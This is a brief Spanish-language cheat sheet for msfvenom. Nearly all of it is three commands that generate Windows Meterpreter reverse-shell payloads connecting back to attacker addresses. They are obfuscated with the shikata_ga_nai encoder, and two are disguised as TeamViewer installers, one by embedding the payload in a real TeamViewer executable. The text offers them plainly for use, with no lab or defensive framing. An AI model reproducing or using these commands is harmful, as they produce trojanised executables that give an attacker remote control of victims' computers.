# MSFVENOM
## Descripción
MSFVENOM es una herramienta que viene integrada en metasploit framework que sirve principalmente para crear payloads, podemos ver algunos ejemplos con enconders para darle algo mas de sabor.

### Forma Típica
```python
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

### Encoder shikata_ga_nai sin interacciones
```python
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

### Encoder shikata_ga_nai con interacciones
```python
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.37 LPORT=443 -x /home/kali/Downloads/TeamViewerQS_x64.exe -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -k -f exe > /home/kali/Downloads/giafar.exe
```

